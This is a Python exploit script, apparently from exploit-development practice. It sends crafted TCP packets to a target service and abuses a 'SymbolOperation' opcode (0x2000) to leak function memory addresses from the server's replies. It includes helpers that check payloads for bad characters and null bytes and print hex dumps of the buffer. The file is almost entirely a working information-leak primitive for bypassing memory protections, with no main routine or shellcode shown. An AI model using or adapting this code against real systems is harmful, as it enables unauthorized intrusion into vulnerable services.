import argparse
import socket
import sys
from struct import pack

from colorama import Back, Fore, Style, init

init()
bad_chars = [0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]


def checkBadChars(data):
    # Iterate over bytes in the data and check for bad characters
    for byte in data:
        if byte in bad_chars:
            return True
    return False


def log(msg: str, indent: int = 0, level: str = "*"):
    """
    Prints a message with a given indentation and log level.
    :param msg: The message to log.
    :param indent: The number of tabs to indent the message.
    :param level: `"+": Success, "-": Error, "*": Info, "!": Warning, "!!!": Critical, "o": Normal`
    """
    indent_str = "\t" * indent
    level_map = {
        "+": ("[+]", Fore.GREEN),
        "-": ("[-]", Fore.RED),
        "!": ("[!]", Fore.YELLOW),
        "!!!": ("[!!!]", Fore.LIGHTRED_EX),
        "*": ("[*]", Fore.CYAN),
        "o": ("[o]", Fore.WHITE),
    }
    prefix, color = level_map.get(level, (f"[{level}]", Fore.WHITE))
    print(f"{color}{indent_str}{prefix} {msg}{Style.RESET_ALL}")


def checkNullBytes(data: bytes) -> bool:
    """Check if the given data contains null bytes. Iterate across
    overlapping 2-byte windows and return False if any b'\\x00\\x00'
    or unaligned null byte pair is found, else True.
    """
    for i in range(len(data) - 1):
        if data[i : i + 2] == b"\x00\x00":
            return False
    return True


def sendMalBuff(buf, socketTup, DEBUG_Response=False):
    timeout_seconds = 15
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout_seconds)
            s.connect(socketTup)

            # Check buffer for bad chars
            if checkBadChars(buf):
                log("Buffer contains bad characters", level="!")

            # Send the buffer to the server
            s.sendall(buf)
            if DEBUG_Response:
                printBuffer(buf, width="dd")
                log(f"Sent {len(buf)} bytes successfully!", level="+")

            # Print out response from server
            if DEBUG_Response:
                log("Waiting for response from server...", level="*")
            response = b""
            while True:
                try:
                    chunk = s.recv(1024)
                    if DEBUG_Response:
                        log(f"Received chunk: {chunk}", level="!!!")
                except socket.timeout:
                    break
                if not chunk:
                    break
                response += chunk
                if b"Address is:" in response:
                    break

            if not response:
                log("No response received from server", level="-")
                sys.exit(1)

            return response

    except socket.timeout:
        log("Socket operation timed out", level="-")
        sys.exit(1)
    except socket.error as error:
        log(f"Socket error: {error}", level="-")
        sys.exit(1)


def leakFunctionAddress(func, socketTup):

    log(f"Attempting to leak address for {func.decode('utf-8').strip(chr(0))}...", level="*")
    # Append SymbolOperation to the Func
    symOpFunc = b"SymbolOperation" + func

    # Checksum
    buf = bytearray()

    # psAgentCommand
    buf += bytearray([0x41] * 0xC)  # psAgentCommand        0x04 - 0x34
    buf += pack("<i", 0x2000)  # Opcode                0x10
    buf += pack("<i", 0x0)  # 1st memcpy: offset    0x14
    buf += pack("<i", 0x100)  # 1st memcpy: size      0x18
    buf += pack("<i", 0x100)  # 2nd memcpy: offset    0x1C
    buf += pack("<i", 0x100)  # 2nd memcpy: size      0x20
    buf += pack("<i", 0x200)  # 3rd memcpy: offset    0x24
    buf += pack("<i", 0x100)  # 3rd memcpy: size      0x28
    buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34

    # psCommandBuffer
    buf += symOpFunc + b"A" * (0x100 - len(symOpFunc))
    buf += b"B" * 0x100
    buf += b"C" * 0x100

    # Checksum
    buf = pack(">i", len(buf) - 4) + buf

    response = sendMalBuff(buf, socketTup, DEBUG_Response=False)
    if response:
        # Should have a valid response, parse it and get the address
        functionAddress = parseResponse(response)
        log(f"Leaked {func.decode('utf-8').strip(chr(0))}: 0x{functionAddress:08x}", level="+")

        if functionAddress == 1:
            log(f"Failed to leak address for {func.decode('utf-8').strip(chr(0))}", level="-")
            sys.exit(1)
    else:
        log(f"No response received from server when leaking {func.decode('utf-8').strip(chr(0))}", level="-")
        sys.exit(1)
    # Return the address only
    return functionAddress


def printBuffer(buf, width="db"):
    if width == "db":
        w = 1
        groups_per_line = 16
    elif width == "dw":
        w = 2
        groups_per_line = 8
    elif width == "dd":
        w = 4
        groups_per_line = 4
    else:
        log(f"Invalid width {width}", level="-")
        exit(-1)

    bytes_per_line = groups_per_line * w
    for i in range(0, len(buf), bytes_per_line):
        print(
            Fore.YELLOW + f"\t" + f"{i:04x} - {min(i+bytes_per_line, len(buf)):04x}: " + Style.RESET_ALL,
            end="",
        )
        for g in range(groups_per_line):
            start = i + g * w
            if start >= len(buf):
                break
            if width == "db":
                for j in range(w):
                    if start + j < len(buf):
                        byte_val = buf[start + j]
                        chunk = buf[start + j : start + j + 1]  # Single byte slice or adapt based on checkNullBytes

                        # Priority 1: Check bad char first
                        if byte_val in bad_chars:
                            print(f"{Fore.RED}{Back.WHITE}{byte_val:02x}{Style.RESET_ALL}", end=" ")
                        # Priority 2: Run checkNullBytes after bad char check
                        elif not checkNullBytes(buf[start + j : start + j + 2]):
                            print(f"{Fore.CYAN}{Back.WHITE}{byte_val:02x}{Style.RESET_ALL}", end=" ")
                        else:
                            print(f"{byte_val:02x}", end=" ")
                    else:
                        print("  ", end="")
            else:
                val = 0
                bad_in_group = False
                null_in_group = False
                for j in range(w):
                    if start + j < len(buf):
                        b_val = buf[start + j]
                        val |= b_val << (8 * (w - 1 - j))
                        if b_val in bad_chars:
                            bad_in_group = True

                # Run checkNullBytes on the group chunk
                group_chunk = buf[start : start + w]
                if not checkNullBytes(group_chunk):
                    null_in_group = True

                # Format wide groups (dw, dd) with priority on bad chars over nulls
                if width == "dw":
                    if bad_in_group:
                        print(f"{Fore.RED}{Back.WHITE}{val:04x}{Style.RESET_ALL}", end=" ")
                    elif null_in_group:
                        print(f"{Fore.CYAN}{Back.WHITE}{val:04x}{Style.RESET_ALL}", end=" ")
                    else:
                        print(f"{val:04x}", end=" ")
                elif width == "dd":
                    if bad_in_group:
                        print(f"{Fore.RED}{Back.WHITE}{val:08x}{Style.RESET_ALL}", end=" ")
                    elif null_in_group:
                        print(f"{Fore.CYAN}{Back.WHITE}{val:08x}{Style.RESET_ALL}", end=" ")
                    else:
                        print(f"{val:08x}", end=" ")

        # Add ASCII representation
        print(" ", end="")
        for j in range(bytes_per_line):
            idx = i + j
            if idx < len(buf):
                byte_val = buf[idx]
                if 32 <= byte_val <= 126:
                    print(chr(byte_val), end="")
                else:
                    print(".", end="")
            else:
                print(" ", end="")
        print()


def parseResponse(response):
    """Parse a server response and extract the leaked address"""
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
        if line.find(pattern) != -1:
            address = int((line.split(pattern)[-1].strip()), 16)
    if not address:
        log("Could not find the address in the Response", level="-")
        sys.exit()
    return address


def parse_args():
    parser = argparse.ArgumentParser(description="Send a crafted buffer to the target service")
    parser.add_argument("ip", help="Target IP address")
    return parser.parse_args()


def repeat_bytes(pattern, length):
    if isinstance(pattern, str):
        # Check if the string looks like a hex string (e.g., contains only hex characters and even length, or starts with 0x)
        clean_pattern = pattern.replace("0x", "")
        is_hex = all(c in "0123456789abcdefABCDEF" for c in clean_pattern) and len(clean_pattern) % 2 == 0

        if is_hex and len(clean_pattern) > 0:
            try:
                pattern = bytes.fromhex(clean_pattern)
            except ValueError:
                # Fallback to ASCII bytes if hex conversion fails despite matching criteria
                pattern = pattern.encode("utf-8")
        else:
            # Treat pure text strings as ASCII/UTF-8 bytes
            pattern = pattern.encode("utf-8")

    if not pattern:
        raise ValueError("Pattern cannot be empty")

    return (pattern * ((length + len(pattern) - 1) // len(pattern)))[:length]
